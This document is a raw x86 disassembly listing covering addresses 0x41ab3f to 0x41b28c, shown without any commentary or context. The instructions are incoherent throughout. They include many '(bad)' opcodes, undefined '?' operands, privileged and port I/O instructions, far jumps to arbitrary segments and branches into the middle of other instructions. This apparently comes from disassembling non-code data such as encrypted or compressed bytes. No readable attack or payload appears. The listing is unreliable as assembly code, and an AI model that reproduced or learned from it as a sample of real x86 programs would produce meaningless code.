  41ab3f:	cmc    
  41ab40:	dec    esp
  41ab41:	pushf  
  41ab42:	mov    ebp,0x672b9a5
  41ab47:	push   edi
  41ab48:	sub    DWORD PTR ds:0xfb705b77,ebp
  41ab4e:	xchg   edx,eax
  41ab4f:	jns    0x41ab73
  41ab51:	pop    ebx
  41ab52:	lock jp 0x41aae8
  41ab55:	sbb    bl,bh
  41ab57:	adc    cl,0xe0
  41ab5a:	or     dl,BYTE PTR [ebp+0x63]
  41ab5d:	sbb    DWORD PTR [ebx-0x4e5e61d9],edi
  41ab63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab64:	pop    ss
  41ab65:	cmc    
  41ab66:	inc    ecx
  41ab67:	or     esi,DWORD PTR [edx+0x685e0027]
  41ab6d:	inc    edx
  41ab6e:	adc    bh,BYTE PTR [ecx-0x5b]
  41ab71:	scas   al,BYTE PTR es:[edi]
  41ab72:	ss fucomp st(0)
  41ab75:	jg     0x41abd5
  41ab77:	pop    edi
  41ab78:	mov    ds:0xee0c9b2f,eax
  41ab7d:	and    dh,ch
  41ab7f:	cli    
  41ab80:	jae    0x41ab2e
  41ab82:	pop    eax
  41ab83:	imul   edx,esp,0xffffff8d
  41ab86:	les    edx,FWORD PTR [ebx]
  41ab88:	icebp  
  41ab89:	sahf   
  41ab8a:	imul   esp,esi,0x71
  41ab8d:	cmp    eax,0x3476b0f3
  41ab92:	or     DWORD PTR [ecx],ebx
  41ab94:	jmp    0xf0904d53
  41ab99:	or     ebp,ecx
  41ab9b:	or     BYTE PTR [edx+0x56d90d04],bl
  41aba1:	mov    ebp,?
  41aba3:	fiadd  WORD PTR [eax]
  41aba5:	pop    ebp
  41aba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aba7:	push   eax
  41aba8:	outs   dx,DWORD PTR ds:[esi]
  41aba9:	sahf   
  41abaa:	js     0x41abc5
  41abac:	jnp    0x41abf4
  41abae:	sbb    eax,0x9827e068
  41abb3:	dec    ebp
  41abb4:	mov    esi,0x20ba4c6f
  41abb9:	sbb    eax,0x3a6fdee3
  41abbe:	pushf  
  41abbf:	ins    DWORD PTR es:[edi],dx
  41abc0:	(bad)  
  41abc1:	push   0x22
  41abc3:	sbb    BYTE PTR [ebx],bh
  41abc5:	stos   BYTE PTR es:[edi],al
  41abc6:	cmp    al,0x84
  41abc8:	cli    
  41abc9:	push   ecx
  41abca:	xlat   BYTE PTR ds:[ebx]
  41abcb:	inc    eax
  41abcc:	repnz push 0xffffffe5
  41abcf:	loopne 0x41ac20
  41abd1:	test   al,0xc0
  41abd3:	jmp    0x41ab9c
  41abd5:	pop    ecx
  41abd6:	and    DWORD PTR [edi-0x19],edi
  41abd9:	imul   edi,DWORD PTR [ecx+0x78],0xffffffc3
  41abdd:	loopne 0x41ab75
  41abdf:	dec    sp
  41abe1:	fld    QWORD PTR ds:[esi-0x1a4267de]
  41abe8:	push   ebp
  41abe9:	sub    eax,0x17716ce5
  41abee:	sbb    eax,0xbccc5ae
  41abf3:	and    BYTE PTR [eax+0xd],dh
  41abf6:	cwde   
  41abf7:	imul   edx,DWORD PTR [ebx+0x3e2451b0],0x67
  41abfe:	xor    eax,0x63388ba
  41ac03:	push   esp
  41ac04:	jnp    0x41abda
  41ac06:	bound  ebx,QWORD PTR [edx]
  41ac08:	jne    0x41abc4
  41ac0a:	or     DWORD PTR [esi-0x35],edx
  41ac0d:	in     eax,dx
  41ac0e:	(bad)  
  41ac10:	mov    ebx,0xb0ce7568
  41ac15:	int3   
  41ac16:	and    cl,BYTE PTR [edx]
  41ac18:	je     0x41ab9e
  41ac1a:	test   al,0xd9
  41ac1c:	or     ebp,DWORD PTR [esi-0x2020124c]
  41ac22:	dec    edx
  41ac23:	pop    ecx
  41ac24:	or     al,0x66
  41ac26:	pop    ebx
  41ac27:	imul   edi,DWORD PTR [bp+di+0x5e60],0x8d94deb3
  41ac30:	adc    DWORD PTR [ebp-0x2ee70d01],ebx
  41ac36:	sub    eax,0x706bc913
  41ac3b:	(bad)  
  41ac3c:	mov    cl,0x38
  41ac3e:	loop   0x41abe2
  41ac40:	sbb    esp,DWORD PTR [eax]
  41ac42:	aaa    
  41ac43:	inc    edi
  41ac44:	mov    dh,0xed
  41ac46:	aaa    
  41ac47:	retf   0xc90
  41ac4a:	test   DWORD PTR [ebx+ebp*4+0x24f0ae1d],0xd500b25f
  41ac55:	add    al,0x46
  41ac57:	pusha  
  41ac58:	(bad)  
  41ac59:	dec    ebp
  41ac5a:	cli    
  41ac5b:	mov    ecx,0x6ef9a41f
  41ac60:	jo     0x41ac1f
  41ac62:	xchg   ecx,eax
  41ac63:	cwde   
  41ac64:	sub    DWORD PTR [edi-0x7f],edx
  41ac67:	push   ecx
  41ac68:	push   edi
  41ac69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac6a:	shl    BYTE PTR [ecx+eiz*8-0x13],cl
  41ac6e:	mov    cl,0x9e
  41ac70:	cmp    ebp,DWORD PTR [ebx+0x5b]
  41ac73:	jmp    0x2c94:0xf03a834d
  41ac7a:	lea    ecx,[ebp+eax*2+0x220c02b1]
  41ac81:	shr    ch,1
  41ac83:	outs   dx,DWORD PTR ds:[esi]
  41ac84:	scas   eax,DWORD PTR es:[edi]
  41ac85:	lods   eax,DWORD PTR ds:[esi]
  41ac86:	push   ss
  41ac87:	clc    
  41ac88:	stos   DWORD PTR es:[edi],eax
  41ac89:	mov    esi,0xca0fec2d
  41ac8e:	pop    ebx
  41ac8f:	in     eax,dx
  41ac90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac91:	ss jbe 0x41ac9f
  41ac94:	or     BYTE PTR [edx-0x15],al
  41ac97:	in     eax,0xd
  41ac99:	sbb    esp,0xc33ef504
  41ac9f:	retf   
  41aca0:	adc    al,0xe8
  41aca2:	and    al,BYTE PTR [ebp+0x17a35b3d]
  41aca8:	aad    0xa8
  41acaa:	pusha  
  41acab:	adc    al,0x36
  41acad:	rol    BYTE PTR [esi-0x3e],cl
  41acb0:	pop    esi
  41acb1:	mov    bl,0xdc
  41acb3:	sahf   
  41acb4:	lods   al,BYTE PTR ds:[esi]
  41acb5:	data16 jmp 0x41acb6
  41acb8:	mov    dl,al
  41acba:	fs jnp 0x41ac64
  41acbd:	mov    bh,0x55
  41acbf:	push   ebx
  41acc0:	cmp    dl,0xfe
  41acc3:	(bad)  
  41acc4:	sahf   
  41acc5:	inc    DWORD PTR [bp+si]
  41acc8:	mov    al,ds:0xb3b175c6
  41accd:	xor    esp,DWORD PTR [edi]
  41accf:	lea    ebp,[edi]
  41acd1:	jmp    0x51287674
  41acd6:	xor    ch,BYTE PTR [ebp-0x46a4291]
  41acdc:	xor    DWORD PTR [eax+0x20],edx
  41acdf:	rol    BYTE PTR [esi],0x83
  41ace2:	sbb    al,0x4b
  41ace4:	loop   0x41acaf
  41ace6:	(bad)  
  41ace9:	inc    esp
  41acea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aceb:	or     DWORD PTR [edx+0x68],0x15d1c118
  41acf2:	into   
  41acf3:	(bad)  
  41acf4:	out    dx,eax
  41acf5:	mov    ds,ebx
  41acf7:	push   ebp
  41acf8:	jae    0x41ac7d
  41acfa:	add    edx,DWORD PTR [edi-0x3f]
  41acfd:	pop    ss
  41acfe:	add    eax,0xded8bf6c
  41ad03:	ins    DWORD PTR es:[edi],dx
  41ad04:	cs (bad) 
  41ad06:	imul   edx
  41ad08:	arpl   dx,ax
  41ad0a:	cld    
  41ad0b:	sti    
  41ad0c:	mov    esp,0x5f1af2e6
  41ad11:	dec    edx
  41ad12:	mov    dh,0x8f
  41ad14:	sbb    ebx,DWORD PTR [ebp+0x45]
  41ad17:	mov    dh,0xc
  41ad19:	(bad)  
  41ad1a:	rcl    DWORD PTR [esi+eiz*1+0xeb8e0e2],1
  41ad21:	dec    edx
  41ad22:	push   ds
  41ad23:	xchg   esi,eax
  41ad24:	pop    ecx
  41ad25:	mov    ebp,DWORD PTR [ebp-0x12]
  41ad28:	outs   dx,BYTE PTR ds:[esi]
  41ad29:	shl    DWORD PTR [ebp-0x11e16c61],1
  41ad2f:	xchg   edx,eax
  41ad30:	ss pushf 
  41ad32:	xchg   ecx,eax
  41ad33:	inc    ebx
  41ad34:	push   eax
  41ad35:	xor    ecx,DWORD PTR [edx+0x48]
  41ad38:	loop   0x41ad46
  41ad3a:	int    0xb1
  41ad3c:	in     al,0x7d
  41ad3e:	push   0x908584e0
  41ad43:	or     ch,cl
  41ad45:	shr    DWORD PTR [edi+0x52afab0a],1
  41ad4b:	cmp    DWORD PTR [edi-0x81edc75],eax
  41ad51:	nop
  41ad52:	inc    edx
  41ad53:	pop    esp
  41ad54:	aaa    
  41ad55:	mov    edi,0x269d9bd0
  41ad5a:	xor    bh,BYTE PTR [eax+0x53]
  41ad5d:	ins    DWORD PTR es:[edi],dx
  41ad5e:	mov    dl,0x78
  41ad60:	fcomp  DWORD PTR [eax+0x4e4d46c4]
  41ad66:	fstp   TBYTE PTR [edx-0x77]
  41ad69:	std    
  41ad6a:	cmp    BYTE PTR [esi],al
  41ad6c:	mov    BYTE PTR [eax-0x4a],al
  41ad6f:	sbb    DWORD PTR [esi-0x68959e9a],ebx
  41ad75:	shr    DWORD PTR [edx],0xd0
  41ad78:	loope  0x41ad66
  41ad7a:	mov    ebx,0x4f62370c
  41ad7f:	das    
  41ad80:	mov    esi,0xc142cdb0
  41ad85:	pop    eax
  41ad86:	mov    ds:0x2e13890b,al
  41ad8b:	sar    BYTE PTR [eax+eax*8-0x7982ebf],cl
  41ad92:	and    bh,BYTE PTR [ebx+edi*2]
  41ad95:	lds    esp,FWORD PTR [edx]
  41ad97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad98:	adc    ecx,DWORD PTR [ecx+0x4]
  41ad9b:	(bad)  [eax+esi*1]
  41ad9e:	add    al,0x25
  41ada0:	cmp    BYTE PTR [ebx+eax*1-0xfefa45f],cl
  41ada7:	jge    0x41ae1d
  41ada9:	xor    al,0x79
  41adab:	mov    ecx,0x998677e9
  41adb0:	stc    
  41adb1:	jmp    0xff4e8746
  41adb6:	jno    0x41ad9a
  41adb8:	push   ebp
  41adb9:	(bad)  
  41adba:	lods   eax,DWORD PTR ds:[esi]
  41adbb:	call   0x5d4b8149
  41adc0:	inc    edx
  41adc1:	or     edi,DWORD PTR [ecx+0x4d]
  41adc4:	and    al,0x54
  41adc6:	mov    esi,0xc010a56a
  41adcb:	sub    al,0xdf
  41adcd:	out    dx,eax
  41adce:	mov    bl,0x2c
  41add0:	iret   
  41add1:	add    DWORD PTR [edi],0xffffffcf
  41add4:	or     eax,0xae8737ae
  41add9:	push   esp
  41adda:	dec    esi
  41addb:	js     0x41ae2f
  41addd:	sub    eax,0x5fb592cb
  41ade2:	mov    edx,0xe267b987
  41ade7:	cs pusha 
  41ade9:	pop    esp
  41adea:	sbb    eax,0x766ef5d4
  41adef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adf0:	xchg   DWORD PTR ds:0x60a617d4,eax
  41adf6:	(bad)  
  41adf7:	fmul   QWORD PTR [eax-0x4af170bf]
  41adfd:	pop    ebp
  41adfe:	xor    DWORD PTR [edx],edi
  41ae00:	push   eax
  41ae01:	xchg   esi,eax
  41ae02:	pop    edi
  41ae03:	sbb    BYTE PTR [esi+0x66],bh
  41ae06:	and    BYTE PTR [edx-0x1c],dh
  41ae09:	inc    esp
  41ae0a:	ins    DWORD PTR es:[edi],dx
  41ae0b:	stc    
  41ae0c:	gs int 0xad
  41ae0f:	xchg   ebp,eax
  41ae10:	and    al,0x7c
  41ae12:	retf   
  41ae13:	xchg   esp,eax
  41ae14:	jbe    0x41ae3f
  41ae16:	jmp    0x8e0a:0x761c9cb5
  41ae1d:	sub    eax,ebp
  41ae1f:	fsubrp st(5),st
  41ae21:	std    
  41ae22:	pop    ebp
  41ae23:	pop    eax
  41ae24:	cs scas al,BYTE PTR es:[di]
  41ae27:	jae    0x41adba
  41ae29:	or     DWORD PTR [ecx],esi
  41ae2b:	outs   dx,BYTE PTR ds:[esi]
  41ae2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae2d:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41ae2f:	imul   ecx,DWORD PTR [ebp-0x2cd05487],0x72325a74
  41ae39:	es dec edx
  41ae3b:	xor    DWORD PTR [ecx-0x13a46f7c],esp
  41ae41:	jmp    0x48a2:0x3935a7d0
  41ae48:	mov    esi,0x52f204b5
  41ae4d:	mov    ebx,0x5c55ce04
  41ae52:	test   BYTE PTR [ebx+0xe],bl
  41ae55:	dec    eax
  41ae56:	(bad)  
  41ae57:	fdivr  QWORD PTR [esi-0x77e62cde]
  41ae5d:	lock (bad) 
  41ae60:	xlat   BYTE PTR ds:[ebx]
  41ae61:	fidiv  DWORD PTR [edx]
  41ae63:	loope  0x41adeb
  41ae65:	push   esi
  41ae66:	adc    DWORD PTR [edx+edx*8],ebp
  41ae69:	dec    esi
  41ae6a:	sar    DWORD PTR ds:0xf03d77e2,0x28
  41ae71:	(bad)  
  41ae72:	add    eax,DWORD PTR [edx+eax*4]
  41ae75:	cli    
  41ae76:	in     al,0x7f
  41ae78:	cmp    al,0xe7
  41ae7a:	lods   eax,DWORD PTR ds:[esi]
  41ae7b:	ins    DWORD PTR es:[edi],dx
  41ae7c:	pushf  
  41ae7d:	cmp    ecx,eax
  41ae7f:	enter  0x3a4d,0xda
  41ae83:	xlat   BYTE PTR ds:[ebx]
  41ae84:	pop    esi
  41ae85:	pop    eax
  41ae86:	adc    cl,BYTE PTR [edi-0x1d]
  41ae89:	faddp  st(1),st
  41ae8b:	out    dx,eax
  41ae8c:	adc    al,0x6f
  41ae8e:	scas   eax,DWORD PTR es:[edi]
  41ae8f:	lds    edi,FWORD PTR [edi-0x4f]
  41ae92:	cdq    
  41ae93:	adc    al,0xf9
  41ae95:	mov    ebp,0x528e97a1
  41ae9a:	jo     0x41aee1
  41ae9c:	leave  
  41ae9d:	mov    fs,WORD PTR [ecx-0x71]
  41aea0:	push   ecx
  41aea1:	adc    DWORD PTR [esi-0x353f2a03],edx
  41aea7:	nop
  41aea8:	dec    esi
  41aea9:	in     al,0xe3
  41aeab:	and    al,BYTE PTR [edx+0x39478006]
  41aeb1:	jbe    0x41aef7
  41aeb3:	test   eax,0x8a1b28b
  41aeb8:	icebp  
  41aeb9:	or     al,0x8f
  41aebb:	xor    BYTE PTR [ecx],0x87
  41aebe:	jecxz  0x41aedb
  41aec0:	test   BYTE PTR [ecx-0x30],cl
  41aec3:	jl     0x41ae9a
  41aec5:	fucomp st(1)
  41aec7:	cmp    eax,0xc082f0e4
  41aecc:	fwait
  41aecd:	jno    0x41ae73
  41aecf:	jae    0x41aeb8
  41aed1:	cmp    DWORD PTR [esi-0xa],edi
  41aed4:	jmp    0x2944f847
  41aed9:	pop    edi
  41aeda:	cli    
  41aedb:	ja     0x41af34
  41aedd:	sbb    al,0xd7
  41aedf:	repnz not ebp
  41aee2:	sahf   
  41aee3:	lahf   
  41aee4:	sbb    ebx,esi
  41aee6:	ins    BYTE PTR es:[edi],dx
  41aee7:	retf   
  41aee8:	call   0x878e:0x77798308
  41aeef:	scas   al,BYTE PTR es:[edi]
  41aef0:	dec    edi
  41aef1:	in     al,dx
  41aef2:	lods   eax,DWORD PTR ds:[esi]
  41aef3:	out    dx,eax
  41aef4:	lods   eax,DWORD PTR ds:[esi]
  41aef5:	adc    DWORD PTR [edx+0xb7ed40e],edi
  41aefb:	mov    esi,0x4f887125
  41af00:	outs   dx,DWORD PTR ds:[esi]
  41af01:	mov    esp,0x74722bb1
  41af06:	mov    dl,0x24
  41af08:	les    edx,FWORD PTR [ecx+0x231f060]
  41af0e:	push   edx
  41af0f:	and    cl,al
  41af11:	xor    eax,0x9dfc73ac
  41af16:	sub    eax,0x64331c4f
  41af1b:	shr    BYTE PTR [edi-0xe0729eb],1
  41af21:	mov    ecx,0x5776d619
  41af26:	aas    
  41af27:	jge    0x41af1b
  41af29:	in     eax,dx
  41af2a:	lahf   
  41af2b:	push   ds
  41af2c:	nop
  41af2d:	pop    esi
  41af2e:	loopne 0x41aef1
  41af30:	sbb    BYTE PTR [esi+0x71],al
  41af33:	xchg   ebx,eax
  41af34:	or     eax,0xe3f50a66
  41af39:	sub    BYTE PTR [edi-0x54a6df9c],0xb2
  41af40:	mov    ah,0x8b
  41af42:	and    BYTE PTR [ecx],al
  41af44:	adc    dl,0x81
  41af47:	in     al,0xf6
  41af49:	retf   0x427d
  41af4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af4d:	in     eax,dx
  41af4e:	or     dl,BYTE PTR [ebx+0x77b949e9]
  41af54:	nop
  41af55:	cmp    al,cl
  41af57:	sti    
  41af58:	jl     0x41af3f
  41af5a:	out    dx,eax
  41af5b:	and    eax,0x3ef4c5ac
  41af60:	arpl   WORD PTR [ebx-0x228cd0ca],ax
  41af66:	das    
  41af67:	fld    QWORD PTR [ecx+ebp*2+0x6c9817be]
  41af6e:	jl     0x41af3e
  41af70:	stc    
  41af71:	xchg   ebx,eax
  41af72:	call   0x4757857a
  41af77:	lods   al,BYTE PTR ds:[esi]
  41af78:	pop    ds
  41af79:	sub    BYTE PTR [esi+0x315d5fdd],0xfb
  41af80:	jnp    0x41af24
  41af82:	xor    BYTE PTR [edx+0x42ea0e32],dh
  41af88:	fidivr DWORD PTR [esp+edi*4]
  41af8b:	pusha  
  41af8c:	call   0xd221c78e
  41af91:	aas    
  41af92:	inc    eax
  41af93:	in     eax,dx
  41af94:	add    al,0xa0
  41af96:	hlt    
  41af97:	out    0x9e,eax
  41af99:	xchg   edi,eax
  41af9a:	sub    sp,cx
  41af9d:	cli    
  41af9e:	sub    al,0x77
  41afa0:	test   eax,0x80a1ec87
  41afa5:	cmp    dl,BYTE PTR [ecx-0x70]
  41afa8:	ja     0x41afa5
  41afaa:	aam    0xf2
  41afac:	pop    ebx
  41afad:	out    0x40,eax
  41afaf:	sub    eax,0xfa1d553d
  41afb4:	sub    al,0x29
  41afb6:	xor    ecx,edi
  41afb8:	addr16 jno 0x41af9a
  41afbb:	sbb    al,0xd8
  41afbd:	lods   eax,DWORD PTR ds:[esi]
  41afbe:	ret    
  41afbf:	mov    ds:0xab18f70c,al
  41afc4:	shl    DWORD PTR [eax+ebx*1+0x45],0x76
  41afc9:	idiv   dh
  41afcb:	shl    DWORD PTR [ecx+0xa3a0f76],1
  41afd1:	xchg   DWORD PTR [edi+ebp*2-0x2f],esp
  41afd5:	mov    edx,0xe0171bb7
  41afda:	lods   eax,DWORD PTR ds:[esi]
  41afdb:	enter  0x7432,0xcc
  41afdf:	mov    edi,0x719654a6
  41afe4:	mov    bl,0xab
  41afe6:	mov    dh,0x3f
  41afe8:	or     esi,DWORD PTR [edx-0x25]
  41afeb:	rol    BYTE PTR [eax+esi*1+0x1a],0xc9
  41aff0:	push   0x5aa45c47
  41aff5:	mov    ah,0x36
  41aff7:	enter  0x9bbd,0x11
  41affb:	popa   
  41affc:	and    ebp,esi
  41affe:	mov    edx,0x470d4fb6
  41b003:	ret    0x10a
  41b006:	clc    
  41b007:	mov    ecx,0xcc8dd68a
  41b00c:	out    dx,al
  41b00d:	test   eax,0x46d3b36b
  41b012:	xor    BYTE PTR [ebp-0x69],ah
  41b015:	pop    edi
  41b016:	dec    ecx
  41b017:	dec    esp
  41b018:	ss push ebx
  41b01a:	lods   eax,DWORD PTR ds:[esi]
  41b01b:	sbb    dh,BYTE PTR ds:0xcb2a4e70
  41b021:	fdivp  st(6),st
  41b023:	js     0x41b076
  41b025:	mov    cl,0x8e
  41b027:	or     al,0x8
  41b029:	add    bh,BYTE PTR [eax]
  41b02b:	cmp    al,0x4d
  41b02d:	aaa    
  41b02e:	out    0x84,eax
  41b030:	dec    edx
  41b031:	(bad)  
  41b032:	out    dx,eax
  41b033:	sub    DWORD PTR [ebx],ecx
  41b035:	ror    BYTE PTR [eax],0xab
  41b038:	sub    eax,0x15f72d6a
  41b03d:	xor    eax,0x25bd9c97
  41b042:	cmp    cl,BYTE PTR [ecx-0x16]
  41b045:	cdq    
  41b046:	iret   
  41b047:	push   eax
  41b048:	mov    edi,0x12277692
  41b04d:	scas   eax,DWORD PTR es:[edi]
  41b04e:	pusha  
  41b04f:	stos   BYTE PTR es:[edi],al
  41b050:	add    DWORD PTR [ebx-0x78],ebp
  41b053:	and    BYTE PTR [ebx-0x4e98aedb],0x88
  41b05a:	fadd   st,st(4)
  41b05c:	xlat   BYTE PTR ds:[ebx]
  41b05d:	test   al,0x7e
  41b05f:	jecxz  0x41b0ae
  41b061:	cmc    
  41b062:	sub    al,0x26
  41b064:	xchg   BYTE PTR ss:0x959cfa2b,bl
  41b06b:	dec    esp
  41b06c:	xor    DWORD PTR [eax+0x3267d8a],0xffffffcd
  41b073:	mov    bl,0xb9
  41b075:	rcl    DWORD PTR [ebx-0x4],cl
  41b078:	push   ds
  41b079:	jbe    0x41b086
  41b07b:	loopne 0x41b025
  41b07d:	and    eax,0x3c2d449f
  41b082:	out    dx,al
  41b083:	pop    ebp
  41b084:	das    
  41b085:	sub    BYTE PTR [edi-0x513e6c32],ch
  41b08b:	push   ecx
  41b08c:	or     edx,DWORD PTR [ecx]
  41b08e:	inc    eax
  41b08f:	sbb    ch,BYTE PTR [ebx+0x5c]
  41b092:	test   al,0x2c
  41b094:	xor    bl,al
  41b096:	add    eax,DWORD PTR [esp+eiz*2-0x326d2176]
  41b09d:	adc    DWORD PTR [esi-0x51827bba],0xffffff8e
  41b0a4:	xor    dh,BYTE PTR [ebx]
  41b0a6:	cmp    DWORD PTR es:[edx],ebp
  41b0a9:	xchg   ebp,eax
  41b0aa:	fs jns 0x41b0d6
  41b0ad:	loop   0x41b091
  41b0af:	xchg   edi,eax
  41b0b0:	lds    edx,FWORD PTR [ebx+0x336bda43]
  41b0b6:	fild   QWORD PTR [edi+0x5cc58e17]
  41b0bc:	loopne 0x41b0bb
  41b0be:	push   ecx
  41b0bf:	shl    BYTE PTR [ecx+0x1],cl
  41b0c2:	push   ebp
  41b0c3:	push   ds
  41b0c4:	test   DWORD PTR [ebx],edi
  41b0c6:	retf   
  41b0c7:	dec    eax
  41b0c8:	pop    eax
  41b0c9:	mov    esi,DWORD PTR [eax+0x21e7ff5f]
  41b0cf:	jae    0x41b080
  41b0d1:	or     al,0xde
  41b0d3:	dec    esi
  41b0d4:	ficomp DWORD PTR [ebx]
  41b0d6:	sbb    eax,0xb653a0f2
  41b0db:	push   ds
  41b0dc:	inc    edi
  41b0dd:	out    0x9f,eax
  41b0df:	inc    ebx
  41b0e0:	dec    edx
  41b0e1:	inc    ecx
  41b0e2:	retf   
  41b0e3:	mov    edi,0x5864284
  41b0e8:	xor    eax,0xadbf09f5
  41b0ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0ee:	mov    esp,0x6890d5e9
  41b0f3:	in     al,dx
  41b0f4:	loopne 0x41b0f9
  41b0f6:	in     eax,0x1a
  41b0f8:	stc    
  41b0f9:	dec    eax
  41b0fa:	mov    ebx,0x74d89b20
  41b0ff:	rcr    BYTE PTR [esi+esi*4],cl
  41b102:	sub    esi,DWORD PTR [edx-0x6d]
  41b105:	push   ebx
  41b106:	shl    BYTE PTR [esi+0x2502a5cd],cl
  41b10c:	mov    dl,0xf
  41b10e:	(bad)  
  41b10f:	sbb    ecx,ebp
  41b111:	aaa    
  41b112:	jmp    0x2217f781
  41b117:	lods   al,BYTE PTR ds:[esi]
  41b118:	jbe    0x41b15e
  41b11a:	mov    cl,0x58
  41b11c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b11d:	enter  0x9678,0x1d
  41b121:	daa    
  41b122:	jge    0x41b187
  41b124:	in     al,dx
  41b125:	clc    
  41b126:	sbb    edx,DWORD PTR [ecx+0x33]
  41b129:	jbe    0x41b14a
  41b12b:	mov    eax,0x368b1112
  41b130:	cmp    BYTE PTR [eax],dh
  41b132:	mov    ebp,0x26331d43
  41b137:	jnp    0x41b1ad
  41b139:	out    0x98,eax
  41b13b:	and    DWORD PTR [esi+0x7d],0x17
  41b13f:	pop    ebx
  41b140:	or     ebp,DWORD PTR [ebp+0x52]
  41b143:	inc    ebp
  41b144:	pcmpeqw mm4,QWORD PTR [edi]
  41b147:	xor    dl,bl
  41b149:	repz (bad) 
  41b14b:	bound  edi,QWORD PTR [ecx+0x30aa2abf]
  41b151:	ins    DWORD PTR es:[edi],dx
  41b152:	enter  0xce97,0x50
  41b156:	inc    ebp
  41b157:	lock mov bl,0x71
  41b15a:	das    
  41b15b:	dec    eax
  41b15c:	ret    
  41b15d:	mov    WORD PTR [eax+ecx*1],es
  41b160:	jae    0x41b118
  41b162:	out    0xa0,eax
  41b164:	mov    ebp,DWORD PTR [edi*4-0x5e0c90e6]
  41b16b:	out    0x4c,al
  41b16d:	inc    esi
  41b16e:	int    0xee
  41b170:	je     0x41b137
  41b172:	jle    0x41b118
  41b174:	mov    ecx,0x5e116ae9
  41b179:	out    0x17,al
  41b17b:	into   
  41b17c:	ror    BYTE PTR [ebx],1
  41b17e:	fsubr  QWORD PTR [esi]
  41b180:	or     eax,0x4d7e3607
  41b185:	dec    ebx
  41b186:	inc    BYTE PTR [esi]
  41b188:	add    al,0x10
  41b18a:	adc    ebp,DWORD PTR [ebx+ebp*4]
  41b18d:	fcom   QWORD PTR [edx+0x1abedc37]
  41b193:	call   0x9e54:0x7294f640
  41b19a:	and    DWORD PTR [ebx],0xffffff96
  41b19d:	and    DWORD PTR [edx+0x503d66b3],ebp
  41b1a3:	popf   
  41b1a4:	sbb    esi,esp
  41b1a6:	dec    ebx
  41b1a7:	ss mov ebp,0x84fc8aa0
  41b1ad:	jb     0x41b15e
  41b1af:	ja     0x41b1b0
  41b1b1:	aad    0x20
  41b1b3:	retf   
  41b1b4:	inc    esi
  41b1b5:	loope  0x41b208
  41b1b7:	sahf   
  41b1b8:	aas    
  41b1b9:	sub    ebx,DWORD PTR [edx-0x66]
  41b1bc:	xchg   edi,eax
  41b1bd:	push   ss
  41b1be:	and    bh,BYTE PTR [edx]
  41b1c0:	inc    edi
  41b1c1:	or     cl,BYTE PTR [eax-0x4b]
  41b1c4:	jbe    0x41b1d1
  41b1c6:	push   ebp
  41b1c7:	xchg   ebx,eax
  41b1c8:	pop    ecx
  41b1c9:	cli    
  41b1ca:	inc    esi
  41b1cb:	ja     0x41b1d0
  41b1cd:	loopne 0x41b186
  41b1cf:	ja     0x41b197
  41b1d1:	mov    WORD PTR [eax+0x41ee6d1e],?
  41b1d7:	mov    dh,0x7a
  41b1d9:	xor    ecx,eax
  41b1db:	push   ebx
  41b1dc:	or     ah,BYTE PTR [ecx+0x62d6e904]
  41b1e2:	out    0x38,al
  41b1e4:	push   ebp
  41b1e5:	sub    eax,0xed8cb6d6
  41b1ea:	adc    BYTE PTR [ecx-0x80],bl
  41b1ed:	mov    ds:0xa9249e18,al
  41b1f2:	pop    ds
  41b1f3:	inc    edi
  41b1f4:	xlat   BYTE PTR ds:[ebx]
  41b1f5:	pop    edx
  41b1f6:	cli    
  41b1f7:	cdq    
  41b1f8:	imul   esi,DWORD PTR [eax],0xc40d7af9
  41b1fe:	inc    ebp
  41b1ff:	popf   
  41b200:	add    DWORD PTR [esi+0x560d2d9c],esi
  41b206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b207:	jmp    0x41b1a6
  41b209:	data16 loop 0x41b1e4
  41b20c:	or     eax,0x882f728e
  41b211:	pop    edx
  41b212:	inc    ebp
  41b213:	xor    ebp,DWORD PTR [ecx]
  41b215:	cmp    al,0x77
  41b217:	xchg   edi,eax
  41b218:	pop    eax
  41b219:	and    eax,0x2e987d1a
  41b21e:	or     ah,cl
  41b220:	ins    DWORD PTR es:[edi],dx
  41b221:	mov    DWORD PTR [ecx+0x3c],esp
  41b224:	pminub mm2,QWORD PTR [esi-0x1e]
  41b228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b229:	shl    DWORD PTR [esi-0x78],1
  41b22c:	loop   0x41b283
  41b22e:	pusha  
  41b22f:	cmp    al,0x13
  41b231:	js     0x41b23a
  41b233:	xlat   BYTE PTR ds:[ebx]
  41b234:	sbb    esp,ebp
  41b236:	adc    DWORD PTR [esi-0xc],0xffffffa2
  41b23a:	mov    ebp,edx
  41b23c:	jbe    0x41b232
  41b23e:	es (bad) 
  41b240:	jge    0x41b1d1
  41b242:	loope  0x41b20b
  41b244:	mov    ecx,0xc76f187c
  41b249:	mov    dl,0xb6
  41b24b:	std    
  41b24c:	adc    eax,0x44217f7
  41b251:	mov    bl,0x1a
  41b253:	adc    ecx,DWORD PTR [edi-0x2f7b340c]
  41b259:	jne    0x41b1db
  41b25b:	in     al,dx
  41b25c:	or     edi,edi
  41b25e:	or     dh,cl
  41b260:	pop    ds
  41b261:	mov    ah,BYTE PTR ds:0x113601f0
  41b267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b268:	cmp    cl,al
  41b26a:	inc    ebx
  41b26b:	dec    ebx
  41b26c:	ss arpl bp,dx
  41b26f:	test   al,0xe4
  41b271:	std    
  41b272:	mov    DWORD PTR [ebp-0x36],edx
  41b275:	js     0x41b20e
  41b277:	mov    ah,0x14
  41b279:	jno    0x41b2c1
  41b27b:	xor    DWORD PTR ds:0xa3194a35,0x34
  41b282:	add    eax,0xe5a1d206
  41b287:	pop    esp
  41b288:	xchg   esi,eax
  41b289:	and    ch,BYTE PTR [eax-0x12]
  41b28c:	loop   0x41b2f2
